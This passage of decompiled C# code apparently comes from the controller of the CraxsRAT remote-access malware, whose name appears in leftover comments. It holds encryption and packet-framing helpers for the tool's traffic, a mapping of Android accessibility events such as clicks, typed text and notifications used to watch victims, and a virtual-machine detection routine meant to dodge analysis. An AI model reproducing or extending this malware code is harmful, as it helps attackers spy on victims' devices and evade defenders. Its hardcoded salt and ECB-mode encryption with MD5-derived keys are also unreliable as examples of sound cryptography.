					Interlocked.CompareExchange(ref _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init, new StaticLocalInitFlag(), null);
				bool lockTaken = false;
				try
				{
					Monitor.Enter(_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init, ref lockTaken);
					if (_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State == 0)
					{
						_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State = 2;
						_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload = ParametersLong0;
					}
					else if (_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init.State = 1;
					if (lockTaken)
						Monitor.Exit(_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init);
				}
				if (_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init == null)
					Interlocked.CompareExchange(ref _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init, new StaticLocalInitFlag(), null);
				bool lockTaken2 = false;
				try
				{
					Monitor.Enter(_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init, ref lockTaken2);
					if (_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State == 0)
					{
						_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State = 2;
						_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload = ParametersLong1;
					}
					else if (_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init.State = 1;
					if (lockTaken2)
						Monitor.Exit(_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init);
				}
				long num = ParametersLong0 - _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload;
				long num2 = ParametersLong1 - _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload;
				_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload = ParametersLong0;
				_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload = ParametersLong1;
				result = new object[2]
				{
					BytesConverter((num2 < 0L) ? 0L : num2).GetValue(0),
					BytesConverter((num < 0L) ? 0L : num).GetValue(0)
				};
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				result = new string[2] { "n/a", "n/a" };
				//////CraxsAlert.Showinformation("Sorry");
			}
			return result;
		}
	}

	public static byte[] DE(byte[] by, string k)
	{
		MemoryStream memoryStream = new MemoryStream();
		checked
		{
			using (MemoryStream memoryStream2 = new MemoryStream(by))
			{
				RijndaelManaged rijndaelManaged = Rijndle(k);
				using CryptoStream cryptoStream = new CryptoStream(memoryStream2, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
				byte[] buffer = new byte[(int)(memoryStream2.Length - 1L) + 1];
				int count = cryptoStream.Read(buffer, 0, (int)memoryStream2.Length);
				memoryStream.Write(buffer, 0, count);
			}
			return memoryStream.ToArray();
		}
	}

	private static RijndaelManaged Rijndle(string secretKey)
	{
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(secretKey, System.Text.Encoding.Unicode.GetBytes("xy7h8842n61q50xf2x"));
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		checked
		{
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.BlockSize / 8.0));
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.KeySize / 8.0));
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			return rijndaelManaged;
		}
	}

	public static byte[] FormatPacket(string Strings, byte[] bByte)
	{
		MemoryStream memoryStream = new MemoryStream();
		byte[] array = CGzip(bByte);
		byte[] array2 = CGzip(Encoding().GetBytes(Strings));
		byte[] bytes = Encoding().GetBytes(Conversions.ToString(array2.Length));
		byte[] bytes2 = Encoding().GetBytes("\0");
		byte[] bytes3 = Encoding().GetBytes(Conversions.ToString(array.Length));
		memoryStream.Write(bytes, 0, bytes.Length);
		memoryStream.Write(bytes2, 0, bytes2.Length);
		memoryStream.Write(bytes3, 0, bytes3.Length);
		memoryStream.Write(bytes2, 0, bytes2.Length);
		memoryStream.Write(array2, 0, array2.Length);
		memoryStream.Write(array, 0, array.Length);
		byte[] result = memoryStream.ToArray();
		memoryStream.Dispose();
		return result;
	}

	public static string[] GetStatistics(string data)
	{
		string text = "time=";
		string text2 = "packet loss";
		string[] result;
		try
		{
			string text3 = data.ToLower();
			if (text3.Contains(text))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(text3.ToLower().Split(new string[1] { text }, StringSplitOptions.None).GetValue(1));
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, null, "Split", new object[2]
				{
					new string[1] { "ms" },
					StringSplitOptions.None
				}, null, null, null), null, "GetValue", new object[1] { 0 }, null, null, null));
				text = Conversions.ToString(objectValue2).Trim();
			}
			else
				text = "0";
			if (text3.Contains(text2))
			{
				object objectValue3 = RuntimeHelpers.GetObjectValue(text3.Split(new string[1] { text2 }, StringSplitOptions.None).GetValue(0));
				object[] array = (object[])NewLateBinding.LateGet(objectValue3, null, "Split", new object[2]
				{
					new string[1] { "," },
					StringSplitOptions.None
				}, null, null, null);
				text2 = Conversions.ToString(array.GetValue(checked(array.Length - 1)));
			}
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			result = new string[2] { "", "" };
			//////CraxsAlert.Showinformation("Sorry");
			goto IL_0193;
		}
		result = ((Operators.CompareString(text2, "packet loss", TextCompare: false) != 0) ? new string[2]
		{
			text.Trim(),
			text2.Trim()
		} : new string[2] { "", "" });
		goto IL_0193;
		IL_0193:
		return result;
	}

	public static string GetIPAddress()
	{
		try
		{
			string hostName = Dns.GetHostName();
			IPAddress[] addressList = Dns.GetHostEntry(hostName).AddressList;
			foreach (IPAddress iPAddress in addressList)
			{
				if (iPAddress.ToString().StartsWith("192.168.1."))
					return iPAddress.ToString();
			}
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return "127.0.0.1";
	}

	public static int RateConverter(int Value, int Totalsize)
	{
		int result;
		try
		{
			result = ((Totalsize != 0) ? checked((int)Math.Round((double)Value / (double)Totalsize * 100.0)) : 0);
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			result = 0;
			//////CraxsAlert.Showinformation("Sorry");
		}
		return result;
	}

	private static byte[] GenerateKey(string key)
	{
		byte[] bytes = System.Text.Encoding.UTF8.GetBytes(key);
		SHA256Managed sHA256Managed = new SHA256Managed();
		return sHA256Managed.ComputeHash(bytes);
	}

	public static string AccessibilityEvent(int v)
	{
		return v switch
		{
			0 => "CLICKED", 
			1 => "FOCUSED", 
			2 => "LONG CLICKED", 
			3 => "TEXT", 
			4 => "NOTIFICATION", 
			5 => "WINDOW CHANGED", 
			_ => "n/a", 
		};
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esflags);

	private static EXECUTION_STATE Power()
	{
		return SetThreadExecutionState((EXECUTION_STATE)(-2147483645));
	}

	public static void AcquirePower()
	{
		Power();
	}

	public static string AES_Encrypt(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		new MD5CryptoServiceProvider();
		string text = "";
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		byte[] bytes = aSCIIEncoding.GetBytes(pass);
		try
		{
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			byte[] bytes2 = System.Text.Encoding.ASCII.GetBytes(input);
			return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes2, 0, bytes2.Length));
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return "";
	}

	public static string AES_Decrypt(string text, string password)
	{
		string result;
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(System.Text.Encoding.ASCII.GetBytes(password));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(text);
			string @string = System.Text.Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = @string;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			result = "";
			//////CraxsAlert.Showinformation("Sorry");
		}
		return result;
	}

	public static string Encrypt(string text, string password)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[32];
		byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(System.Text.Encoding.ASCII.GetBytes(password));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		byte[] bytes = System.Text.Encoding.ASCII.GetBytes(text);
		return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
	}

	public static string AesDecrypt(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		new MD5CryptoServiceProvider();
		string text = "";
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		byte[] bytes = aSCIIEncoding.GetBytes(pass);
		try
		{
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array = Convert.FromBase64String(input);
			return System.Text.Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return "";
	}

	public static bool isVmw()
	{
		using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
		{
			using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject item in managementObjectCollection)
			{
				string text = item["Manufacturer"].ToString().ToLower();
				if ((Operators.CompareString(text, "microsoft corporation", TextCompare: false) == 0 && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || Operators.CompareString(item["Model"].ToString(), "VirtualBox", TextCompare: false) == 0)
					return true;
			}
		}
		return false;
	}
}
